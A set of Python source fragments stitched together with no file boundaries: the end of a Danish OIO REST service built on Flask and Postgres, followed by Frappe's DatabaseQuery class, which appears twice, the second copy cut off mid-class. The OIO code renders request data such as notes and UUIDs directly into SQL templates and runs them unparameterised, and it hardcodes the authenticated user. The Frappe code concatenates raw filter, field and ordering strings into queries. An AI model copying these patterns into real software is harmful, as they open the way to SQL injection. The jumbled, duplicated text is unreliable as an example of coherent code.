    GENERAL FUNCTION AND CLASS DEFINITIONS
"""


def get_connection():
    """Handle all intricacies of connecting to Postgres."""
    connection = psycopg2.connect("dbname={0} user={1}".format(DATABASE,
                                                               DB_USER))
    connection.autocommit = True
    return connection


def get_authenticated_user():
    """Return hardcoded UUID until we get real authentication in place."""
    return "615957e8-4aa1-4319-a787-f1f7ad6b5e2c"


def convert_attributes(attributes):
    "Convert attributes from dictionary to list in correct order."
    for attr_name in attributes:
        current_attr_periods = attributes[attr_name]
        converted_attr_periods = []
        for attr_period in current_attr_periods:
            field_names = get_attribute_fields(attr_name)
            attr_value_list = [
                attr_period[f] if f in attr_period else None
                for f in field_names
                ]
            converted_attr_periods.append(attr_value_list)
        attributes[attr_name] = converted_attr_periods
    return attributes


class Livscyklus(Enum):
    OPSTAAET = 'Opstaaet'
    IMPORTERET = 'Importeret'
    PASSIVERET = 'Passiveret'
    SLETTET = 'Slettet'
    RETTET = 'Rettet'


"""
    GENERAL SQL GENERATION.

    All of these functions generate bits of SQL to use in complete statements.
    At some point, we might want to factor them to an "sql_helpers.py" module.
"""


def sql_state_array(state, periods, class_name):
    """Return an SQL array of type <state>TilsType."""
    with open('templates/sql/state_array.sql', 'r') as f:                    
        raw_sql = f.read()                    
    t = Template(raw_sql)                    
    sql = t.render(class_name=class_name, state_name=state,
                   state_periods=periods)
    return sql


def sql_attribute_array(attribute, periods):
    """Return an SQL array of type <attribute>AttrType[]."""
    with open('templates/sql/attribute_array.sql', 'r') as f:                    
        raw_sql = f.read()                    
    t = Template(raw_sql)                    
    sql = t.render(attribute_name=attribute, attribute_periods=periods)
    return sql


def sql_relations_array(class_name, relations):
    """Return an SQL array of type <class_name>RelationType[]."""
    with open('templates/sql/relations_array.sql', 'r') as f:                    
        raw_sql = f.read()                    
    t = Template(raw_sql)                    
    sql = t.render(class_name=class_name, relations=relations)
    return sql


def sql_convert_registration(states, attributes, relations, class_name):
    """Convert input JSON to the SQL arrays we need."""
    sql_states = []
    for s in get_state_names(class_name):
        periods = states[s] if s in states else []
        sql_states.append(
            sql_state_array(s, periods, class_name)
        )

    sql_attributes = []
    for a in get_attribute_names(class_name):
        periods = attributes[a] if a in attributes else []
        sql_attributes.append(
            sql_attribute_array(a, periods)
        )

    sql_relations = sql_relations_array(class_name, relations)

    return (sql_states, sql_attributes, sql_relations)


"""
    GENRAL OBJECT RELATED FUNCTIONS
"""


def object_exists(class_name, uuid):
    """Check if an object with this class name and UUID exists already."""
    sql = "select (%s IN (SELECT DISTINCT facet_id from facet_registrering))"
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql, (uuid,))
    result = cursor.fetchone()[0]
    
    return result


def create_or_import_object(class_name, note, attributes, states, relations,
                            uuid=None):
    """Create a new object by calling the corresponding stored procedure.

    Create a new object by calling actual_state_create_or_import_{class_name}.
    It is necessary to map the parameters to our custom PostgreSQL data types.
    """

    # Data from the BaseRegistration.
    # Do not supply date, that is generated by the DB.
    life_cycle_code = (Livscyklus.OPSTAAET.value if uuid is None
                       else Livscyklus.IMPORTERET.value)
    user_ref = get_authenticated_user()

    attributes = convert_attributes(attributes)
    (
        sql_states, sql_attributes, sql_relations
    ) = sql_convert_registration(states, attributes, relations, class_name)
    with open('templates/sql/create_object.sql', 'r') as f:                    
        sql_raw = f.read()                    
    sql_template = Template(sql_raw)                    
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note,
        states=sql_states,
        attributes=sql_attributes,
        relations=sql_relations)
    # Call Postgres! Return OK or not accordingly
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]


def delete_object(class_name, note, uuid):
    """Delete object by using the stored procedure.
    
    Deleting is the same as updating with the life cycle code "Slettet".
    """

    user_ref = get_authenticated_user()
    life_cycle_code = Livscyklus.SLETTET.value
    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:                    
        sql_raw = f.read()                    
    sql_template = Template(sql_raw)                    
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note
    )
    # Call Postgres! Return OK or not accordingly
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]

def passivate_object(class_name, note, uuid):
    """Passivate object by calling the stored procedure."""

    user_ref = get_authenticated_user()
    life_cycle_code = Livscyklus.PASSIVERET.value
    with open('templates/sql/passivate_or_delete_object.sql', 'r') as f:                    
        sql_raw = f.read()                    
    sql_template = Template(sql_raw)                    
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note
    )
    # Call PostgreSQL
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql)
    output = cursor.fetchone()
    print output
    return output[0]


def update_object(class_name, note, attributes, states, relations, uuid=None):
    """Update object with the partial data supplied."""
    life_cycle_code = Livscyklus.RETTET.value
    user_ref = get_authenticated_user()

    attributes = convert_attributes(attributes)
    (
        sql_states, sql_attributes, sql_relations
    ) = sql_convert_registration(states, attributes, relations, class_name)

    with open('templates/sql/update_object.sql', 'r') as f:                    
        sql_raw = f.read()                    
    sql_template = Template(sql_raw)                    
    sql = sql_template.render(
        class_name=class_name,
        uuid=uuid,
        life_cycle_code=life_cycle_code,
        user_ref=user_ref,
        note=note,
        states=sql_states,
        attributes=sql_attributes,
        relations=sql_relations)
    # Call PostgreSQL
    conn = get_connection()
    cursor = conn.cursor()
    try:
        cursor.execute(sql)
        output = cursor.fetchone()
        print output
    except psycopg2.DataError:
        # Thrown when no changes
        pass
    return uuid


def list_objects(class_name, uuid, virkning_fra, virkning_til,
                 registreret_fra, registreret_til):
    """List objects with the given uuids, optionally filtering by the given
    virkning and registering periods."""

    assert isinstance(uuid, list)

    with open('templates/sql/list_objects.sql', 'r') as f:                    
        sql_raw = f.read()                    
    sql_template = Template(sql_raw)                    
    sql = sql_template.render(
        class_name=class_name
    )

    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute(sql, {
        'uuid': uuid,
        'registrering_tstzrange': DateTimeTZRange(registreret_fra,
                                                  registreret_til),
        'virkning_tstzrange': DateTimeTZRange(virkning_fra, virkning_til)
    })
    output = cursor.fetchone()
    return output


from flask import jsonify, request
import db


# Just a helper during debug
def j(t): return jsonify(output=t)


class OIOStandardHierarchy(object):
    """Implement API for entire hierarchy."""

    _classes = []

    @classmethod
    def setup_api(cls, flask, base_url):
        """Set up API for the classes included in the hierarchy.

        Note that version number etc. may have to be added to the URL."""
        for c in cls._classes:
            c.create_api(cls._name, flask, base_url)


class OIORestObject(object):
    """
    Implement an OIO object - manage access to database layer for this object.

    This class is intended to be subclassed, but not to be initialized.
    """

    @classmethod
    def create_object(cls):
        """
        CREATE object, generate new UUID.
        """
        if not request.json:
            abort(400)                    
        note = request.json.get("Note", "")
        attributes = request.json.get("Attributter", {})
        states = request.json.get("Tilstande", {})
        relations = request.json.get("Relationer", {})
        uuid = db.create_or_import_object(cls.__name__, note, attributes,
                                          states, relations)
        return jsonify({'uuid': uuid}), 201

    @classmethod
    def get_objects(cls):
        """
        LIST or SEARCH facets, depending on parameters.
        """
        virkning_fra = request.args.get('virkningFra', None)
        virkning_til = request.args.get('virkningTil', None)
        registreret_fra = request.args.get('registreretFra', None)
        registreret_til = request.args.get('registreretTil', None)

        # TODO: Implement search

        uuid = request.args.get('uuid', None)
        if uuid is None:
            # This is not allowed, but we let the DB layer throw an exception
            uuid = []
        else:
            uuid = uuid.split(',')

        results = db.list_objects(cls.__name__, uuid, virkning_fra,
                                 virkning_til, registreret_fra,
                                 registreret_til)
        if results is None:
            results = []
        # TODO: Return JSON object key should be based on class name,
        # e.g. {"Facetter": [..]}, not {"results": [..]}
        # TODO: Include Return value
        return jsonify({'results': results})

    @classmethod
    def get_object(cls, uuid):
        """
        READ a facet, return as JSON.
        """
        return j("Hent {0} fra databasen og returner som JSON".format(uuid))

    @classmethod
    def put_object(cls, uuid):
        """
        UPDATE, IMPORT or PASSIVIZE an  object.
        """
        if not request.json:
            abort(400)                    
        # Get most common parameters if available.
        note = request.json.get("Note", "")
        attributes = request.json.get("Attributter", {})
        states = request.json.get("Tilstande", {})
        relations = request.json.get("Relationer", {})

        if not db.object_exists(cls.__name__, uuid):
            # Do import.
            result = db.create_or_import_object(cls.__name__, note, attributes,
                                                states, relations, uuid)
            # TODO: When connected to DB, use result properly.
            return j(u"Importeret {0}: {1}".format(cls.__name__, uuid)), 200
        else:
            "Edit or passivate."
            if (request.json.get('livscyklus', '').lower() == 'passiv'):
                # Passivate
                db.passivate_object(
                        cls.__name__, note, uuid
                )
                return j(
                            u"Passiveret {0}: {1}".format(cls.__name__, uuid)
                        ), 200
            else:
                # Edit/change
                result = db.update_object(cls.__name__, note, attributes,
                                          states, relations, uuid)
                return j(u"Opdateret {0}: {1}".format(cls.__name__, uuid)), 200
        return j(u"Forkerte parametre!"), 405

    @classmethod
    def delete_object(cls, uuid):
        # Delete facet
        #import pdb; pdb.set_trace()
        note = request.json.get("Note", "")
        class_name = cls.__name__
        result = db.delete_object(class_name, note, uuid)

        return j("Slettet {0}: {1}".format(class_name, uuid)), 200

    @classmethod
    def create_api(cls, hierarchy, flask, base_url):
        """Set up API with correct database access functions."""
        hierarchy = hierarchy.lower()
        class_name = cls.__name__.lower()
        class_url = u"{0}/{1}/{2}".format(base_url,
                                          hierarchy,
                                          cls.__name__.lower())
        uuid_regex = (
            "[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}" +
            "-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}"
        )
        object_url = u'{0}/<regex("{1}"):uuid>'.format(
            class_url,
            uuid_regex
        )

        flask.add_url_rule(class_url, u'_'.join([cls.__name__, 'get_objects']),
                           cls.get_objects, methods=['GET'])

        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'get_object']),
                           cls.get_object, methods=['GET'])

        flask.add_url_rule(object_url, u'_'.join([cls.__name__, 'put_object']),
                           cls.put_object, methods=['PUT'])

        flask.add_url_rule(
            class_url, u'_'.join([cls.__name__, 'create_object']),
            cls.create_object, methods=['POST']
        )

        flask.add_url_rule(
            object_url, u'_'.join([cls.__name__, 'delete_object']),
            cls.delete_object, methods=['DELETE']
        )

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
"""build query for doclistview and return results"""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)                    
		self.check_sort_by_table(args.order_by)                    
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, basestring):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions):
		"""build conditions from user filters"""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):
				value = "'%s' AND '%s'" % (
					get_datetime(f.value[0]).strftime("%Y-%m-%d %H:%M:%S.%f"),
					add_to_date(get_datetime(f.value[1]),days=1).strftime("%Y-%m-%d %H:%M:%S.%f"))
				fallback = "'0000-00-00 00:00:00'"
			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif df and df.fieldtype=="Datetime":
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator in ("like", "not like") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator in ("like", "not like") and isinstance(value, basestring):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)                    
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)                    

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """ or `tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values])
					)
				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):                    
		meta = frappe.get_meta(self.doctype)                    
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def check_sort_by_table(self, order_by):                    
		if "." in order_by:                    
			tbl = order_by.split('.')[0]                    
			if tbl not in self.tables:                    
				if tbl.startswith('`'):                    
					tbl = tbl[4:-1]                    
				frappe.throw(_("Please select atleast 1 column from {0} to sort").format(tbl))                    

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
"""build query for doclistview and return results"""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)                    
		self.check_sort_by_table(args.order_by)                    
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, basestring):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
